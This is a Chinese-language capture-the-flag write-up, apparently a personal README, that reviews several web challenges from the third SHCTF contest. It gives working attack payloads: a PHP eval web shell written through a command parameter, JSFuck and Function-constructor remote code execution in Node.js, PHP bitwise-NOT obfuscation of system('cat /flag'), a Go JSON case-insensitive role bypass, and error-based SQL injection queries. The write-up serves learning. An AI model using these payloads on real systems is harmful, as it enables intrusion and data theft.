# The-third-SHCTF
放GitHub做个记录，复盘一下（其实是每道题都学一遍）

05_em_v_CFK

<img width="1445" height="870" alt="image" src="https://github.com/user-attachments/assets/87577f86-ea07-4df6-ac71-ebe626eb7d11" />


一个flag购买商店，然后看源码可以看到一段特别的注释：
5bvE5YvX5Ylt5YdT5Yvdp2uyoTjhpTujYPQyhXoxhVcmnT935L+P5cJjM2I05oPC5cvB55dR5Mlw6LTK54zc5MPa

这个可能还是得靠经验，是rot13加base64解码出来如下：

我上传了个shell.php, 带上show参数get小明的圣遗物吧

然后这里直接访问/shell.php?get显示404，因此可能存在前置路径，用dirsearch能够扫出来uploads,因此可以加上该路径后再进行访问如下：

<img width="956" height="536" alt="image" src="https://github.com/user-attachments/assets/54ee92c7-29e5-4a15-af5b-cef9ca146b91" />


把pass放到md5解密网站上出来就是114514，然后后面的cmd可以执行响应命令，可以构造webshell:

key=114514&cmd=echo '<?php @eval($_POST[1]);?>' > /var/www/html/1.php

写入成功后可以连接蚁剑，找到index.php,但是我们无法直接修改余额，因此可以先把该文件保存到本地删除再修改上传，发现可以，最后得到我们的flag

<img width="1547" height="551" alt="image" src="https://github.com/user-attachments/assets/02f75374-0246-4132-b778-8c293fd4be19" />


然后这里不连webshell的方法有点复杂，先是ls找文件，然后用：

cmd=find / -name "flag" 

也找不到，说明flag不在系统文件，很可能在数据库中，复现大佬的解题过程：

key=114514&cmd=base64 ../index.php 第一次知道这样的...
```php
<?php
include 'connect.php';

$my_money = 3.00;
$msg = "";
$target_id = 0;

if (isset($_POST['buy']) && isset($_POST['item_id'])) {
    $target_id = (int)$_POST['item_id'];

    if ($target_id > 0) {
        try {
            $stmt = $pdo->prepare("CALL buy_item(?, ?)");
            $stmt->execute([$target_id, $my_money]);
            $res = $stmt->fetch();
            $msg = $res['final_message'];
            $my_money -= $res['current_price'];
        } catch (Exception $e) {
            $msg = "Transaction Error: " . $e->getMessage();
        }
    } else {
        $msg = "Invalid item selected.";
    }
} else {
    try {
        $stmt = $pdo->query("SELECT id, name, price FROM goods ORDER BY id ASC");
        if ($stmt === false) {
            exit;
        }
        $goods_list = $stmt->fetchAll();
    } catch (Exception $e) {
        die("Error fetching goods list.");
    }
}
?>
```

这里的核心在如下两行代码中：

$stmt = $pdo->prepare("CALL buy_item(?, ?)");

$stmt->execute([$target_id, $my_money]);

这里发现了一个关键的逻辑漏洞：
后端调用了一个名为 buy_item 的存储过程。传递的参数是 ($target_id, $my_money)。这里的 $my_money 是 PHP 变量。虽然正常用户只能是 3 块钱，但既然我们有了 Webshell，我们可以直接调用这个存储过程，并传入任意金额,构造的payload为：

key=114514&code=include('../connect.php');var_dump($pdo->query("CALL buy_item(3, 50)")->fetchAll());

原理：
include('../connect.php');：利用现成的文件建立数据库连接对象 $pdo，无需知道数据库密码。
CALL buy_item(3, 50)：手动调用存储过程，购买 ID 3 的商品，并欺骗数据库说我有 50 块钱。

<img width="2130" height="665" alt="image" src="https://github.com/user-attachments/assets/a3e676b5-803b-4558-b439-3fbfab690292" />

```javascript
const express = require('express');
const app = express();
const port = 5000;

app.use(express.json());


const WAF = (recipe) => {
    const ALLOW_CHARS = /^[012345679!\.\-\+\*\/\(\)\[\]]+$/;
    if (ALLOW_CHARS.test(recipe)) {
        return true;
    }
    return false;
};


function calc(operator) {
    return eval(operator);
}

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});


app.post('/calc', (req, res) => {
    const { expr } = req.body;
    console.log(expr);
    if(WAF(expr)){
        var result = calc(expr);
        res.json({ result });
    }else{
        res.json({"result":"WAF"});
    }
});


app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
```
服务器端用的是 eval() 执行用户输入

限制 (WAF)：正则 /^[012345679!.-+*/()[]]+$/ 限制了输入字符。

禁用了字母、引号、大括号等。

允许了 []()!+，这正是 JSFuck 语言的核心字符集。

这种题其实是 JavaScript 原型链 + Function 构造器利用，在很多 Node.js CTF Web RCE 里非常经典，但我没碰到过....所以还得从头来一遍，一般构造的是这样的，最基础的：
```javascript
[]["filter"]["constructor"]("return process")()
```
本质是在 不用直接写 Function 的情况下构造一个函数并执行。

在 JavaScript 里：
```javascript
[].filter
```
是一个函数。

也就是：
```javascript
[].filter === Array.prototype.filter
```
它其实长这样：
```javascript
function filter() { [native code] }
```
在 JS 里：
```javascript
function a(){}
```
它的：
```javascript
a.constructor
```
是：
```javascript
Function
```
验证：
```javascript
[].filter.constructor
```
结果就是：
```javascript
Function
```
所以：
```javascript
[]["filter"]["constructor"]
```
等价于：`
```javascript
Function
```
也就是：
```javascript
Function("code")
```
JavaScript 有一个 动态创建函数的方法：
```javascript
new Function("code")
```
例如：
```javascript
var f = new Function("return 1+1")
f()
```
输出：
```
2
```
等价于：
```javascript
eval("1+1")
```
所以：
```javascript
Function("return process")()
```
就会执行：
return process

那么再结合起来看一遍：
```javascript
[]["filter"]["constructor"]("return process")()
```
第一步
```javascript
[]["filter"]
```
得到：
```javascript
function filter() { [native code] }
```
第二步
```javascript
[]["filter"]["constructor"]
```
得到：
```javascript
Function
```
第三步
```javascript
Function("return process")
```
创建函数：
```javascript
function(){
  return process
}
```
第四步后面的执行函数：
```
()
```

最终效果：
```javascript
process
```
在process中含有许多东西，我们可以通过process去调用require，就是一个关键链：

process.mainModule.require //相当于require

而require是加载模块（module）用的函数。
简单理解：把别的代码文件或内置库引入进来使用。

常见例子如下：
```javascript
const fs = require("fs")
fs.readFileSync("flag.txt")
```
作用就是读取文件

```javascript
const cp = require("child_process")
cp.execSync("ls")
```
作用是引入系统命令

还有一种是引入自己写的文件，比如文件名为a.js
```javascript
const a = require("./a.js")
console.log(a)
```
输出文件中写的内容

然后这里其实可以看到wp最前面用的不是filter，有用到flat啥的，本质都是为了利用function构造器，以下这些都可以：
```javascript
[]["map"]["constructor"]
[]["sort"]["constructor"]
[]["flat"]["constructor"]
setTimeout["constructor"]
规则:任何函数.constructor = Function
```
这里选flat：
```javascript
[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('ls /').toString()")()
[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('cat /flag').toString()")()
```
然后jsfuck编码一下：

<img width="2307" height="450" alt="image" src="https://github.com/user-attachments/assets/518fc8b3-f20a-4de2-a69d-cbb0fa505ec1" />

然后有个html是找ai生成的本地编码解码网页，含有常见的命令生成。

**kill_king**

这里正常玩游戏肯定是不行的，一种方法是改一下每次加点的数据，还有一种是源码里直接给出来的，只不过要自己找一下：
<img width="1469" height="698" alt="image" src="https://github.com/user-attachments/assets/2fe3df8d-b05b-4371-9f64-fc33d5ff50e0" />

这里的漏洞属于典型的 Client-Side Trust（客户端信任） 问题。 服务器端文件 check.php 似乎完全信任前端发送的数据。它并没有校验玩家是否真的击败了 Boss、攻击力数值是否合法或游戏时长是否合理，它仅仅是判断它是否收到了 result=win 的 POST 请求，那么我们可以直接在hackbar里面改一下进去：
```php
<?php
// 国王并没用直接爆出flag，而是出现了别的东西？？？
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['result']) && $_POST['result'] === 'win') {
        highlight_file(__FILE__);
        if(isset($_GET['who']) && isset($_GET['are']) && isset($_GET['you'])){
            $who = (String)$_GET['who'];
            $are = (String)$_GET['are'];
            $you = (String)$_GET['you'];
        
            if(is_numeric($who) && is_numeric($are)){
                if(preg_match('/^\W+$/', $you)){
                    $code =  eval("return $who$you$are;");
                    echo "$who$you$are = ".$code;
                }
            }
        }
    } else {
        echo "Invalid result.";
    }
} else {
    echo "No access.";
}
?>
```
这里要求传入三个参数，并且who和are必须是数字，you必须是非单词字符（不能包含 A-Z, a-z, 0-9, _）、

我们需要执行 system('cat /flag')，但 system、cat、flag 都是字母，会被正则拦截。

使用 PHP 取反绕过技术。 在 PHP 中，我们可以对字符串进行按位取反操作。例如 ~"system" 会变成一串不可见的乱码（高位字符）。这些乱码不属于 [a-zA-Z0-9_]，因此可以绕过 W 正则。 当 PHP 执行 (~"乱码") 时，它会还原回 "system"。

用三元表达式可以构造出return 1?system(cat /flag):1来执行system()方法，由于是直接拼接进参数里，$you进行取反：
```php
<?php
echo urlencode(~'system')."\n";
echo urlencode(~'cat /flag');

//%8C%86%8C%8B%9A%92
//%9C%9E%8B%DF%D0%99%93%9E%98
```
最终的构造：?who=1&you=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98):&are=1
<img width="2911" height="533" alt="image" src="https://github.com/user-attachments/assets/e314541a-8ca7-4b3c-b799-6de8777d43eb" />

Go
进入界面后如下显示：
{"username":"guest","role":"guest","message":"Access denied. Only role='admin' can view the flag."}

正常来说构造json参数就行：{"username":"admin","role":"admin"}

但是我复现的时候没有任何回显，然后wp说存在waf： Go 标准库中的 JSON、XML（以及流行的第三方 YAML）解析器在处理非受信数据时，存在一些设计上或默认行为上的“特性”，这些“特性”在特定场景下很容易被攻击者利用，演变成严重的安全漏洞。此处Go JSON 解析器最关键的缺陷之一，因为它与几乎所有其他主流语言的 JSON 解析器行为都不同（它们通常是严格大小写敏感的）。攻击者可以轻易构造 payload，如 {"action": "UserAction", "aCtIoN": "AdminAction"}，利用这种差异性绕过权限检查。
因此这里构造的是：

{"username":"admin","Role":"admin"}

上古遗迹档案馆

最近因为刚好在看SQL注入所以把这个也写一下，sqlmap我还没用过，感觉还没石粒，等我再熟悉熟悉之后再用，这里先测一下是字符型，采用报错注入：
```SQL
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```
<img width="1306" height="407" alt="image" src="https://github.com/user-attachments/assets/dc182928-5279-430d-8989-b8e2621cc71d" />
```SQL
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
```
<img width="1310" height="426" alt="image" src="https://github.com/user-attachments/assets/f9782733-08e3-4041-957d-0e0551d70fc3" />
```SQL
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secret_vault')),1)#
```
<img width="1305" height="504" alt="image" src="https://github.com/user-attachments/assets/cbec9b9b-1c64-44d4-a55f-e3dbb9190720" />
```SQL
?id=1' and updatexml(1,concat(0x7e,(select substring(concat(secret_key) ,1,30) from secret_vault)),1)#
```
<img width="1375" height="480" alt="image" src="https://github.com/user-attachments/assets/26943a3e-20e8-4a40-9c3e-9c2d620fbb5e" />
后面再改个位置就行，不再截了。








